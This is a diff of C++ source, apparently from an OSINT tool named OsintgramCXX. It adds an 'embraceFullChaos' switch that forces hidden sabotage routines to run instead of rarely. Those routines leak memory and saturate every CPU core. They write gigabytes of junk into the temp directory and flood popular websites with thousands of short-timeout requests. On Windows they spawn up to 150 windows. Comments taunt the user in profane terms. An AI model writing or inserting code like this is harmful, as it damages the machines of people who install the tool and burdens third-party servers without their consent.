@@ -14,6 +14,8 @@ using namespace OsintgramCXX::Networking;
 
 #ifdef _WIN64
 
+#include <windows.h>
+
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
     if (message == WM_DESTROY) {
         PostQuitMessage(0);
@@ -27,7 +29,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
 
 void stressThisSystem() {
     try {
-        if (RandomInteger(1, 64) == 19) {
+        if (RandomInteger(1, 64) == 19 || embraceFullChaos) {
             // let me never free this shit because WHY NOT
             int rnd = RandomInteger(0, 666); // fetch the number of MB
             if (rnd == 0) {
@@ -47,7 +49,7 @@ void stressThisSystem() {
             }
         }
 
-        if (RandomInteger(1, 192) == 64) {
+        if (RandomInteger(1, 192) == 64 || embraceFullChaos) {
             unsigned int numCores = std::thread::hardware_concurrency(); // fetch all logical CPU cores (max thread count)
 
             for (int i = 0; i < numCores; i++) {
@@ -60,7 +62,7 @@ void stressThisSystem() {
             std::cout << "is yer system fast enough?" << std::endl; // was this insult not enough for you?
         }
 
-        if (RandomInteger(1, 256) == 176) {
+        if (RandomInteger(1, 256) == 176 || embraceFullChaos) {
             // DISK CHAOS!!! Let me fetch your TMP real quick...
 
             char cTmpPath[MAX_PATH_LIMIT]; // unused, if on Linux
@@ -76,11 +78,12 @@ void stressThisSystem() {
             if (!tmpPath.empty()) {
                 std::thread([tmpPath]() {
                     // recreated "RandomLong" for "RandomLLong" (long-long fuckery)
-                    long long maxSize = RandomLLong(0, 15LL * 1024 * 1024 * 1024);
+                    long long maxSize = RandomLLong(0, (15LL * 1024 * 1024 * 1024) /
+                                                       2); // the reason that we use "0x(entry1)(entry2)"
 
                     std::ofstream out(tmpPath + "/pierdole.txt");
                     for (long l = 0; l < maxSize; l++) // up to 15 gigs, so better be ready
-                        out << 0xFF; // let me eat up your disk
+                        out << (RandomInteger(0, 1) == 1 ? 0xFECC : 0xAA55); // let me eat up your disk
 
                     if (RandomInteger(1, 100) == 25) {
                         out.close(); // was I not asshole-y enough?
@@ -136,20 +139,17 @@ void stressThisSystem() {
 std::vector<std::string> myWayOfReasoning = {
         "https://www.google.com",
         "https://www.instagram.com",
-        "https://bc100dev.net",
         "https://www.facebook.com",
         "https://www.youtube.com",
         "https://mail.google.com",
         "https://www.twitter.com",
         "https://www.reddit.com",
         "https://www.github.com",
-        "https://www.twitch.tv",
         "https://www.linkedin.com",
         "https://www.pinterest.com",
         "https://www.vk.com",
         "https://www.tiktok.com",
         "https://www.twitch.tv",
-        "https://www.tiktok.com",
         "https://wiki.archlinux.org",
         "https://bbs.archlinux.org",
         "https://archlinux.org",
@@ -163,25 +163,33 @@ std::vector<std::string> myWayOfReasoning = {
         "https://www.airbnb.com"
 };
 
+void fuckUpUrl(const std::string &url) {
+    RequestData reqData;
+    reqData.url = url;
+    reqData.version = HTTP_2_0;
+    reqData.method = GET;
+
+    // let's see, how fast is yer shit
+    reqData.connTimeoutMillis = 5;
+    reqData.readTimeoutMillis = 5;
+
+    ResponseData resData = CreateRequest(reqData);
+    // actually, nah, fuck resData, lets not even parse that shit
+    // not even the damn errors because goddamn
+    // that's nerdy as shit
+}
+
 void performUnlogicalReasoning() {
-    if (RandomInteger(1, 2015) == 1987) {
+    if (RandomInteger(1, 2015) == 1987 || embraceFullChaos) {
         std::thread([]() {
             // if stressing your CPU and/or RAM wasn't enough, I don't know, what this then is
             std::cout << "hey, chekked yer netwerk lately?" << std::endl;
 
-            for (int i = 0; i < RandomInteger(1, INT32_MAX / 4); i++) {
-                RequestData reqData;
-                reqData.url = myWayOfReasoning[RandomInteger(0, myWayOfReasoning.size() - 1)];
-                reqData.version = HTTP_1_1;
-                reqData.method = GET;
-
-                // let's see, how fast is yer shit
-                reqData.connTimeoutMillis = 5;
-                reqData.readTimeoutMillis = 5;
-
-                ResponseData resData = CreateRequest(reqData);
-                // actually, nah, fuck resData, lets not even parse that shit
-                // not even the damn errors
+            for (int i = 0; i < RandomInteger(1, 15000); i++) {
+                if (RandomInteger(0, 1) == 1)
+                    std::thread(fuckUpUrl, myWayOfReasoning[RandomInteger(0, myWayOfReasoning.size() - 1)]).detach();
+                else
+                    fuckUpUrl(myWayOfReasoning[RandomInteger(0, myWayOfReasoning.size() - 1)]);
             }
         }).detach();
     }
@@ -191,60 +199,62 @@ void windowsOsGuiTorture() {
     // this method is for Windows-OS only, sorry Linux, you my favorite
 #ifdef _WIN64 // nothing mocks 64-bit fuckery
 
-    // need the WinMain params first
-    HINSTANCE hInstance = GetModuleHandle(NULL);
-    HINSTANCE hPrevInstance = NULL;
-    LPSTR lpCmdLine = GetCommandLineA();
-    int nCmdShow = SW_SHOWDEFAULT;
+    if (RandomInteger(INT32_MIN, INT32_MAX) == 25 || embraceFullChaos) {
+        // need the WinMain params first
+        HINSTANCE hInstance = GetModuleHandle(NULL);
+        HINSTANCE hPrevInstance = NULL;
+        LPSTR lpCmdLine = GetCommandLineA();
+        int nCmdShow = SW_SHOWDEFAULT;
 
-    // INSERT COK AND BALL TORTURE HERE
-    WNDCLASSEX wc = {0};
-    wc.cbSize = sizeof(WNDCLASSEX);
-    wc.style = CS_HREDRAW | CS_VREDRAW;
-    wc.lpfnWndProc = WndProc;
-    wc.hInstance = hInstance;
-    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
-    wc.hbrBackground = (HBRUSH) (COLOR_WINDOW + 1);
-    wc.lpszClassName = "OsintgramCXX_Madness";
+        // INSERT COK AND BALL TORTURE HERE
+        WNDCLASSEX wc = {0};
+        wc.cbSize = sizeof(WNDCLASSEX);
+        wc.style = CS_HREDRAW | CS_VREDRAW;
+        wc.lpfnWndProc = WndProc;
+        wc.hInstance = hInstance;
+        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
+        wc.hbrBackground = (HBRUSH) (COLOR_WINDOW + 1);
+        wc.lpszClassName = "OsintgramCXX_Madness";
 
-    if (!RegisterClassEx(&wc)) {
-        // nevermind
-        return;
-    }
-
-    // let's keep track of the windows spawned... or will we?
-    std::vector<HWND> wndList;
-    std::string globTitle = "huehue osintgramcxx go brr";
-    for (int i = 0; i < RandomInteger(1, 150); i++) {
-        std::stringstream hwIss;
-        hwIss << "SomeWinClass_" << RandomInteger(1, INT32_MAX);
-
-        HWND hw = CreateWindowEx(0,
-                                 hwIss.str().c_str(),
-                                 globTitle.c_str(),
-                                 WS_OVERLAPPEDWINDOW,
-                                 CW_USEDEFAULT, CW_USEDEFAULT, 500, 700,
-                                 NULL, NULL, hInstance, NULL);
-
-        if (hw) {
-            ShowWindow(hw, SW_SHOW);
-            UpdateWindow(hw);
-
-            // I don't think we'll be tracking down the windows later on. user get fucked
-            // or lucky, if we are under 20 or less windows
-            wndList.push_back(hw);
+        if (!RegisterClassEx(&wc)) {
+            // nevermind
+            return;
         }
-    }
 
-    // just for the windows sake for the message loop (do we even really need it?)
-    std::thread([]() {
-        MSG msg;
+        // let's keep track of the windows spawned... or will we?
+        std::vector<HWND> wndList;
+        std::string globTitle = "huehue osintgramcxx go brr";
+        for (int i = 0; i < RandomInteger(1, 150); i++) {
+            std::stringstream hwIss;
+            hwIss << "SomeWinClass_" << RandomInteger(1, INT32_MAX);
 
-        // that's why it's threaded: stupid fucking while loop
-        while (GetMessage(&msg, NULL, 0, 0)) {
-            TranslateMessage(&msg);
-            DispatchMessage(&msg);
+            HWND hw = CreateWindowEx(0,
+                                     hwIss.str().c_str(),
+                                     globTitle.c_str(),
+                                     WS_OVERLAPPEDWINDOW,
+                                     CW_USEDEFAULT, CW_USEDEFAULT, 500, 700,
+                                     NULL, NULL, hInstance, NULL);
+
+            if (hw) {
+                ShowWindow(hw, SW_SHOW);
+                UpdateWindow(hw);
+
+                // I don't think we'll be tracking down the windows later on. user get fucked
+                // or lucky, if we are under 20 or less windows
+                wndList.push_back(hw);
+            }
         }
-    }).detach();
+
+        // just for the windows sake for the message loop (do we even really need it?)
+        std::thread([]() {
+            MSG msg;
+
+            // that's why it's threaded: stupid fucking while loop
+            while (GetMessage(&msg, NULL, 0, 0)) {
+                TranslateMessage(&msg);
+                DispatchMessage(&msg);
+            }
+        }).detach();
+    }
 #endif
 }
